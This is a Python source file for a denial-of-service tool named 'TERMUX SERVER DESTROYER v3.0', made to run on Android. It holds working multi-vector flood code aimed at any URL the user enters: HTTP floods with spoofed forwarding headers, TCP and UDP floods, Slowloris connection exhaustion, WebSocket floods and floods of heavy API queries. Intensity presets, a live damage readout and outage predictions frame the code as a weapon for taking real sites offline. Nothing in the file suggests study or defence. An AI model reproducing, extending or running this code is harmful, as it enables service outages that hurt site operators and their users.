import socket
import threading
import random
import time
import sys
import hashlib
import requests
import re
from urllib.parse import urlparse, quote, urljoin
import asyncio
import aiohttp
from concurrent.futures import ThreadPoolExecutor
import struct
import json
import base64
import subprocess
import os
import platform
from datetime import datetime
import ssl
import select
import zlib
import gzip
import http.client

# ==============================================
# HYPER DNS RESOLVER & BOTNET SIMULATOR
# ==============================================
class HyperDNSBotnet:
    def __init__(self):
        self.cache = {}
        self.botnet_ips = self._generate_botnet_ips()
        
    def _generate_botnet_ips(self):
        """Generate fake botnet IPs from worldwide ranges"""
        botnet = []
        # Worldwide IP ranges
        ranges = [
            ("1.0.0.0", "1.255.255.255"),
            ("5.0.0.0", "5.255.255.255"),
            ("14.0.0.0", "14.255.255.255"),
            ("23.0.0.0", "23.255.255.255"),
            ("31.0.0.0", "31.255.255.255"),
            ("37.0.0.0", "37.255.255.255"),
            ("45.0.0.0", "45.255.255.255"),
            ("46.0.0.0", "46.255.255.255"),
            ("49.0.0.0", "49.255.255.255"),
            ("58.0.0.0", "58.255.255.255"),
            ("59.0.0.0", "59.255.255.255"),
            ("77.0.0.0", "77.255.255.255"),
            ("78.0.0.0", "78.255.255.255"),
            ("79.0.0.0", "79.255.255.255"),
            ("80.0.0.0", "80.255.255.255"),
        ]
        
        for start, end in ranges:
            start_parts = list(map(int, start.split('.')))
            end_parts = list(map(int, end.split('.')))
            
            for _ in range(100):
                ip_parts = []
                for i in range(4):
                    ip_parts.append(str(random.randint(start_parts[i], end_parts[i])))
                botnet.append('.'.join(ip_parts))
        
        return botnet
    
    def resolve_with_botnet(self, domain):
        """Resolve domain with botnet IP spoofing"""
        try:
            real_ip = socket.gethostbyname(domain)
            return real_ip, random.sample(self.botnet_ips, 30)
        except:
            return domain, []

# ==============================================
# GLOBAL SERVER DESTROYER ENGINE
# ==============================================
class GlobalServerDestroyer:
    def __init__(self):
        self.attack_count = 0
        self.running = False
        self.successful = 0
        self.failed = 0
        self.connections = []
        self.thread_pool = ThreadPoolExecutor(max_workers=500)
        self.lock = threading.Lock()
        self.dns_botnet = HyperDNSBotnet()
        self.target_info = None
        
        # Attack statistics
        self.start_time = 0
        self.peak_rps = 0
        self.total_bandwidth = 0
        
    # ==============================================
    # 1. HTTP/HTTPS NUCLEAR FLOOD (LAYER 7)
    # ==============================================
    def http_nuclear_global_flood(self):
        """HTTP flood that appears from global botnet"""
        real_ip, botnet_ips = self.dns_botnet.resolve_with_botnet(self.target_info['domain'])
        
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0) AppleWebKit/537.36',
        ]
        
        while self.running:
            try:
                spoofed_ip = random.choice(botnet_ips)
                
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                sock.connect((real_ip, self.target_info['port']))
                
                method = random.choice(['GET', 'POST', 'HEAD'])
                path = self._generate_malicious_path()
                
                request_lines = [
                    f"{method} {path} HTTP/1.1",
                    f"Host: {self.target_info['domain']}",
                    f"User-Agent: {random.choice(user_agents)}",
                    f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                    f"X-Forwarded-For: {spoofed_ip}",
                    f"X-Real-IP: {spoofed_ip}",
                    f"Connection: keep-alive",
                    "\r\n"
                ]
                
                request = "\r\n".join(request_lines)
                
                for _ in range(random.randint(3, 8)):
                    sock.send(request.encode())
                
                sock.close()
                
                with self.lock:
                    self.attack_count += random.randint(3, 8)
                    self.successful += 1
                    self.total_bandwidth += len(request) * random.randint(3, 8)
                    
            except Exception as e:
                with self.lock:
                    self.failed += 1
    
    def _generate_malicious_path(self):
        """Generate paths that stress server resources"""
        paths = [
            "/api/users?limit=10000",
            "/search?q=" + "A" * 500,
            "/products?category=" + "&category=".join([str(i) for i in range(50)]),
            "/wp-json/wp/v2/posts?per_page=1000",
            "/graphql?query={users{id,name,email}}",
        ]
        
        return random.choice(paths)
    
    # ==============================================
    # 2. TCP/UDP GLOBAL FLOOD (LAYER 4)
    # ==============================================
    def tcp_global_flood(self):
        """TCP flood from global IPs"""
        real_ip, botnet_ips = self.dns_botnet.resolve_with_botnet(self.target_info['domain'])
        
        while self.running:
            try:
                for _ in range(5):
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(1)
                    sock.connect((real_ip, self.target_info['port']))
                    
                    garbage = b'X' * random.randint(100, 1000)
                    for _ in range(random.randint(3, 8)):
                        sock.send(garbage)
                    
                    sock.close()
                
                with self.lock:
                    self.attack_count += 5
                    self.successful += 1
                    
            except:
                with self.lock:
                    self.failed += 1
    
    def udp_global_flood(self):
        """UDP flood from global IPs"""
        real_ip, botnet_ips = self.dns_botnet.resolve_with_botnet(self.target_info['domain'])
        
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                
                payload = b'X' * random.randint(500, 2000)
                
                ports = [self.target_info['port'], 80, 443, 53]
                for port in ports:
                    for _ in range(random.randint(3, 8)):
                        sock.sendto(payload, (real_ip, port))
                
                sock.close()
                
                with self.lock:
                    self.attack_count += len(ports) * random.randint(3, 8)
                    self.successful += 1
                    self.total_bandwidth += len(payload) * len(ports) * random.randint(3, 8)
                    
            except:
                with self.lock:
                    self.failed += 1
    
    # ==============================================
    # 3. SLOWLORIS GLOBAL (CONNECTION EXHAUSTION)
    # ==============================================
    def slowloris_global_attack(self):
        """Slowloris attack holding connections open"""
        real_ip = self.target_info['ip']
        
        sockets = []
        max_sockets = 100
        
        while self.running and len(sockets) < max_sockets:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(10)
                sock.connect((real_ip, self.target_info['port']))
                
                request = f"GET / HTTP/1.1\r\n"
                request += f"Host: {self.target_info['domain']}\r\n"
                request += "Content-Length: 1000000000\r\n"
                sock.send(request.encode())
                
                sockets.append(sock)
                
                with self.lock:
                    self.attack_count += 1
                    
            except:
                pass
        
        while self.running and sockets:
            for sock in sockets[:]:
                try:
                    sock.send(f"X-Test: {random.randint(1000,9999)}\r\n".encode())
                    time.sleep(random.randint(5, 15))
                except:
                    sockets.remove(sock)
                    try:
                        sock.close()
                    except:
                        pass
        
        for sock in sockets:
            try:
                sock.close()
            except:
                pass
    
    # ==============================================
    # 4. WEBSOCKET GLOBAL FLOOD
    # ==============================================
    def websocket_global_flood(self):
        """WebSocket connection flood"""
        real_ip = self.target_info['ip']
        
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                sock.connect((real_ip, self.target_info['port']))
                
                key = base64.b64encode(os.urandom(16)).decode()
                handshake = (
                    f"GET /ws HTTP/1.1\r\n"
                    f"Host: {self.target_info['domain']}\r\n"
                    f"Upgrade: websocket\r\n"
                    f"Connection: Upgrade\r\n"
                    f"Sec-WebSocket-Key: {key}\r\n"
                    f"Sec-WebSocket-Version: 13\r\n"
                    f"\r\n"
                )
                
                sock.send(handshake.encode())
                
                start_time = time.time()
                while self.running and time.time() - start_time < random.uniform(10, 60):
                    try:
                        sock.send(b'\x89\x00')
                        time.sleep(random.uniform(1, 5))
                    except:
                        break
                
                sock.close()
                
                with self.lock:
                    self.attack_count += 1
                    self.successful += 1
                    
            except:
                with self.lock:
                    self.failed += 1
    
    # ==============================================
    # 5. API ENDPOINT GLOBAL FLOOD
    # ==============================================
    def api_endpoint_global_flood(self):
        """Flood API endpoints with expensive queries"""
        real_ip = self.target_info['ip']
        
        api_endpoints = [
            "/api/v1/users?limit=1000",
            "/api/v1/products?category=all",
            "/api/v1/search?q=test&page=1&size=100",
            "/wp-json/wp/v2/posts",
            "/graphql",
        ]
        
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                sock.connect((real_ip, self.target_info['port']))
                
                endpoint = random.choice(api_endpoints)
                
                request_lines = [
                    f"POST {endpoint} HTTP/1.1",
                    f"Host: {self.target_info['domain']}",
                    "Content-Type: application/json",
                    f"Content-Length: 500",
                    "",
                    json.dumps({"query": "{" + "user{id,name}" * 5 + "}"}),
                ]
                
                request = "\r\n".join(request_lines)
                
                for _ in range(random.randint(2, 5)):
                    sock.send(request.encode())
                
                sock.close()
                
                with self.lock:
                    self.attack_count += random.randint(2, 5)
                    self.successful += 1
                    
            except:
                with self.lock:
                    self.failed += 1
    
    # ==============================================
    # MAIN GLOBAL DESTROYER FUNCTION
    # ==============================================
    def start_global_destruction(self, target_url, intensity="NUCLEAR"):
        """Start global server destruction"""
        # Parse target
        parsed = urlparse(target_url)
        if not parsed.scheme:
            target_url = "http://" + target_url
            parsed = urlparse(target_url)
        
        # Resolve IP
        real_ip, botnet_ips = self.dns_botnet.resolve_with_botnet(parsed.netloc)
        
        self.target_info = {
            'url': target_url,
            'scheme': parsed.scheme,
            'domain': parsed.netloc,
            'ip': real_ip,
            'port': parsed.port or (443 if parsed.scheme == 'https' else 80),
            'path': parsed.path or '/',
            'botnet_ips': botnet_ips,
        }
        
        print(f"\033[91m[🎯] TARGET: {self.target_info['domain']} ({real_ip})")
        print(f"[🌍] BOTNET IPs: {len(botnet_ips)}")
        print(f"[💀] INTENSITY: {intensity}")
        
        # Configure attack
        configs = {
            "NUCLEAR": {
                'http_threads': 100,
                'tcp_threads': 50,
                'udp_threads': 30,
                'slowloris_threads': 30,
                'websocket_threads': 20,
                'api_threads': 40,
                'duration': 0,
            },
            "APOCALYPSE": {
                'http_threads': 50,
                'tcp_threads': 25,
                'udp_threads': 15,
                'slowloris_threads': 15,
                'websocket_threads': 10,
                'api_threads': 20,
                'duration': 300,
            },
            "ARMAGEDDON": {
                'http_threads': 30,
                'tcp_threads': 15,
                'udp_threads': 10,
                'slowloris_threads': 10,
                'websocket_threads': 5,
                'api_threads': 10,
                'duration': 180,
            }
        }
        
        config = configs.get(intensity, configs["NUCLEAR"])
        
        # Launch all attack methods
        print("\033[93m[🚀] DEPLOYING ATTACK WEAPONS...")
        
        self.running = True
        self.start_time = time.time()
        threads = []
        
        # 1. HTTP Nuclear Flood
        print(f"[1] 🔥 HTTP Flood (x{config['http_threads']})")
        for _ in range(config['http_threads']):
            t = threading.Thread(target=self.http_nuclear_global_flood)
            t.daemon = True
            t.start()
            threads.append(t)
        
        # 2. TCP Flood
        print(f"[2] ⚡ TCP Flood (x{config['tcp_threads']})")
        for _ in range(config['tcp_threads']):
            t = threading.Thread(target=self.tcp_global_flood)
            t.daemon = True
            t.start()
            threads.append(t)
        
        # 3. UDP Flood
        print(f"[3] 💀 UDP Flood (x{config['udp_threads']})")
        for _ in range(config['udp_threads']):
            t = threading.Thread(target=self.udp_global_flood)
            t.daemon = True
            t.start()
            threads.append(t)
        
        # 4. Slowloris
        print(f"[4] 🐌 Slowloris (x{config['slowloris_threads']})")
        for _ in range(config['slowloris_threads']):
            t = threading.Thread(target=self.slowloris_global_attack)
            t.daemon = True
            t.start()
            threads.append(t)
        
        # 5. WebSocket
        print(f"[5] 📡 WebSocket (x{config['websocket_threads']})")
        for _ in range(config['websocket_threads']):
            t = threading.Thread(target=self.websocket_global_flood)
            t.daemon = True
            t.start()
            threads.append(t)
        
        # 6. API Endpoint
        print(f"[6] 🗄️ API Flood (x{config['api_threads']})")
        for _ in range(config['api_threads']):
            t = threading.Thread(target=self.api_endpoint_global_flood)
            t.daemon = True
            t.start()
            threads.append(t)
        
        duration_text = 'UNLIMITED' if config['duration'] == 0 else f'{config["duration"]} seconds'
        print(f"\033[92m[✅] WEAPONS DEPLOYED: {len(threads)} threads")
        print(f"[⏱️] DURATION: {duration_text}")
        print("\033[91m[💀] SERVER DESTRUCTION IN PROGRESS...")
        
        # Monitoring loop
        last_count = 0
        last_time = time.time()
        
        try:
            while self.running:
                current_time = time.time()
                elapsed = current_time - self.start_time
                
                # Check duration
                if config['duration'] > 0 and elapsed >= config['duration']:
                    print("\n\033[93m[⏰] Mission complete - Time limit reached")
                    self.running = False
                    break
                
                # Calculate RPS and bandwidth
                time_diff = current_time - last_time
                if time_diff >= 1:
                    current_count = self.attack_count
                    rps = (current_count - last_count) / time_diff
                    self.peak_rps = max(self.peak_rps, rps)
                    
                    # Calculate bandwidth (MB/s)
                    bandwidth_mbps = (self.total_bandwidth / time_diff) / (1024 * 1024)
                    
                    # Damage assessment
                    if rps > 5000:
                        status = "💀 TOTAL DESTRUCTION"
                        color = "\033[91m"
                        effect = "❌ SERVER OFFLINE"
                    elif rps > 2000:
                        status = "🔥 CRITICAL DAMAGE"
                        color = "\033[91m"
                        effect = "⚠️ ALL USERS AFFECTED"
                    elif rps > 1000:
                        status = "⚡ SEVERE IMPACT"
                        color = "\033[93m"
                        effect = "⚠️ MAJOR SLOWDOWN"
                    elif rps > 500:
                        status = "🚀 HEAVY ATTACK"
                        color = "\033[92m"
                        effect = "⏳ NOTICEABLE IMPACT"
                    else:
                        status = "🎯 BUILDING PRESSURE"
                        color = "\033[96m"
                        effect = "⏳ ATTACK IN PROGRESS"
                    
                    print(f"\r{color}[{status}] "
                          f"RPS: {rps:,.0f} | "
                          f"Total: {self.attack_count:,} | "
                          f"BW: {bandwidth_mbps:.1f} MB/s | "
                          f"Time: {elapsed:.0f}s | "
                          f"{effect}\033[0m", end="")
                    
                    last_count = current_count
                    last_time = current_time
                
                time.sleep(0.5)
                
        except KeyboardInterrupt:
            print("\n\033[93m[🛑] Attack stopped by user")
        finally:
            self.running = False
            time.sleep(3)
            
            # Final report
            elapsed = time.time() - self.start_time
            avg_rps = self.attack_count / elapsed if elapsed > 0 else 0
            
            print("\n\033[92m" + "═" * 80 + "\033[0m")
            print("\033[95m[📊] SERVER DESTRUCTION REPORT:")
            print(f"    Target: {self.target_info['domain']}")
            print(f"    Duration: {elapsed:.1f}s")
            print(f"    Total Attacks: {self.attack_count:,}")
            print(f"    Peak RPS: {self.peak_rps:,.0f}")
            print(f"    Average RPS: {avg_rps:,.0f}")
            print(f"    Bandwidth Used: {self.total_bandwidth / (1024*1024*1024):.2f} GB")
            success_rate = (self.successful/(self.successful+self.failed)*100 if (self.successful+self.failed)>0 else 0)
            print(f"    Success Rate: {success_rate:.1f}%")
            
            # Server damage prediction
            print("\n\033[91m[💀] PREDICTED SERVER DAMAGE:")
            if self.peak_rps > 5000:
                print("    • SERVER COMPLETELY OFFLINE")
                print("    • All users see error pages")
                print("    • Recovery: 2+ hours minimum")
            elif self.peak_rps > 2000:
                print("    • SEVERE OUTAGE")
                print("    • 99% of users cannot access")
                print("    • Recovery: 1-2 hours")
            elif self.peak_rps > 1000:
                print("    • MAJOR PERFORMANCE ISSUES")
                print("    • 90% of users experience slowness")
                print("    • Recovery: 30-60 minutes")
            elif self.peak_rps > 500:
                print("    • SIGNIFICANT IMPACT")
                print("    • 70% of users affected")
                print("    • Recovery: 15-30 minutes")
            else:
                print("    • MINOR DISRUPTION")
                print("    • Some users may notice issues")
                print("    • Recovery: <15 minutes")
            
            print("\033[92m" + "═" * 80 + "\033[0m")

# ==============================================
# ADVANCED MAIN INTERFACE
# ==============================================
def main_interface():
    """Advanced main interface"""
    destroyer = GlobalServerDestroyer()
    
    # ASCII Banner
    banner = """
\033[91m
╔╦╗╦ ╦╔═╗╔╗╔╔╦╗╦╔═╗  ╔╦╗╔═╗╔╗╔╔╦╗╔═╗╦═╗
 ║ ║ ║╠═╣║║║ ║║║║    ║║║╣ ║║║ ║ ║╣ ╠╦╝
 ╩ ╚═╝╩ ╩╝╚╝═╩╝╩╚═╝  ╩ ╚═╝╝╚╝ ╩ ╚═╝╩╚═

███████╗██╗  ██╗████████╗██████╗ ███████╗███╗   ███╗███████╗
██╔════╝╚██╗██╔╝╚══██╔══╝██╔══██╗██╔════╝████╗ ████║██╔════╝
█████╗   ╚███╔╝    ██║   ██████╔╝█████╗  ██╔████╔██║█████╗  
██╔══╝   ██╔██╗    ██║   ██╔══██╗██╔══╝  ██║╚██╔╝██║██╔══╝  
███████╗██╔╝ ██╗   ██║   ██║  ██║███████╗██║ ╚═╝ ██║███████╗
╚══════╝╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝╚══════╝╚═╝     ╚═╝╚══════╝
                                                                                                                              
▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
█ Tools: TERMUX SERVER DESTROYER v3.0       █ Developer: Volox                       █ Status: OPTIMIZED FOR ANDROID         █
▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
\033[0m
    """
    print(banner)
    
    while True:
        print("\n\033[96m" + "═" * 80 + "\033[0m")
        print("\033[95m[💀] TERMUX SERVER DESTROYER v3.0")
        print("\033[96m" + "═" * 80 + "\033[0m")
        
        print("\033[92m[1] 🚀 LAUNCH SERVER DESTRUCTION")
        print("[2] 🎯 QUICK TEST ATTACK")
        print("[3] 📊 VIEW STATISTICS")
        print("[4] 🛑 STOP ALL ATTACKS")
        print("[5] ⚠️ EXIT")
        print("\033[96m" + "═" * 80 + "\033[0m")
        
        choice = input("\n\033[93m[?] Select option (1-5): \033[0m").strip()
        
        if choice == "1":
            print("\n\033[96m" + "═" * 80 + "\033[0m")
            print("\033[95m[🚀] SERVER DESTRUCTION LAUNCH")
            print("\033[96m" + "═" * 80 + "\033[0m")
            
            target = input("\033[93m[?] Target URL: \033[0m").strip()
            if not target:
                continue
            
            print("\n\033[91m[💀] SELECT INTENSITY:")
            print("1. 💀💀💀 NUCLEAR (Total Destruction)")
            print("2. 💀💀 APOCALYPSE (Critical Damage)")
            print("3. 💀 ARMAGEDDON (Severe Impact)")
            
            level_choice = input("\033[93m[?] Intensity (1-3): \033[0m").strip()
            
            intensity_map = {"1": "NUCLEAR", "2": "APOCALYPSE", "3": "ARMAGEDDON"}
            intensity = intensity_map.get(level_choice, "NUCLEAR")
            
            confirm = input(f"\n\033[93m[?] Type 'DESTROY' to launch: \033[0m").strip()
            if confirm.upper() == "DESTROY":
                print(f"\n\033[91m[💣] LAUNCHING DESTROYER ON {target}")
                
                for i in range(5, 0, -1):
                    print(f"\r\033[91m[🚀] LAUNCH IN {i}s...\033[0m", end="")
                    time.sleep(1)
                
                print("\n\033[91m[💥] DESTRUCTION INITIATED!")
                destroyer.start_global_destruction(target, intensity)
            else:
                print("\033[92m[✓] Launch cancelled")
        
        elif choice == "2":
            print("\n\033[96m[🎯] QUICK TEST ATTACK")
            target = input("\033[93m[?] Test URL: \033[0m").strip()
            if target:
                try:
                    response = requests.get(target, timeout=5, verify=False)
                    print(f"\033[92m[✓] Target responsive: HTTP {response.status_code}")
                    
                    print("\033[93m[⚡] Starting test attack (30 seconds)...")
                    test_destroyer = GlobalServerDestroyer()
                    
                    # Run in thread to allow monitoring
                    import threading
                    attack_thread = threading.Thread(
                        target=test_destroyer.start_global_destruction,
                        args=(target, "ARMAGEDDON")
                    )
                    attack_thread.daemon = True
                    attack_thread.start()
                    
                    # Wait for 30 seconds
                    time.sleep(30)
                    test_destroyer.running = False
                    print("\033[92m[✓] Test attack completed")
                    
                except Exception as e:
                    print(f"\033[91m[✗] Target unreachable: {e}")
        
        elif choice == "3":
            print("\n\033[96m[📊] ATTACK STATISTICS")
            print(f"    Active: {'YES' if destroyer.running else 'NO'}")
            print(f"    Attack Count: {destroyer.attack_count:,}")
            print(f"    Successful: {destroyer.successful:,}")
            print(f"    Failed: {destroyer.failed:,}")
            print(f"    Peak RPS: {destroyer.peak_rps:,.0f}")
            print(f"    Bandwidth: {destroyer.total_bandwidth / (1024*1024):.2f} MB")
        
        elif choice == "4":
            print("\n\033[93m[🛑] Stopping all attacks...")
            destroyer.running = False
            time.sleep(2)
            print("\033[92m[✓] All attacks stopped")
        
        elif choice == "5":
            print("\n\033[96m[👋] Shutting down...")
            destroyer.running = False
            sys.exit(0)

# ==============================================
# TERMUX OPTIMIZED VERSION
# ==============================================
def check_termux_dependencies():
    """Check and install Termux dependencies"""
    try:
        import requests
    except ImportError:
        print("\033[93m[⚠️] Installing dependencies...")
        os.system("pkg install python -y")
        os.system("pip install requests")
        print("\033[92m[✓] Dependencies installed")
    
    # Check for root (not required in Termux)
    if os.geteuid() == 0:
        print("\033[92m[✓] Running as root")
    else:
        print("\033[93m[ℹ️] Running as normal user")

# ==============================================
# START PROGRAM
# ==============================================
if __name__ == "__main__":
    # Clear screen
    os.system('clear')
    
    # Check dependencies
    check_termux_dependencies()
    
    # Legal warning
    print("\033[91m" + "💀" * 80 + "\033[0m")
    print("\033[91m    TERMUX SERVER DESTROYER v3.0")
    print("    OPTIMIZED FOR ANDROID TERMUX")
    print("    USE AT YOUR OWN RISK")
    print("\033[91m" + "💀" * 80 + "\033[0m")
    
    print("\n\033[96m[1] 🚀 ACTIVATE DESTROYER")
    print("[2] ❌ EXIT")
    
    choice = input("\n\033[93m[?] Select (1-2): \033[0m").strip()
    
    if choice == "1":
        main_interface()
    else:
        print("\n\033[92m[👋] Destroyer deactivated\033[0m")
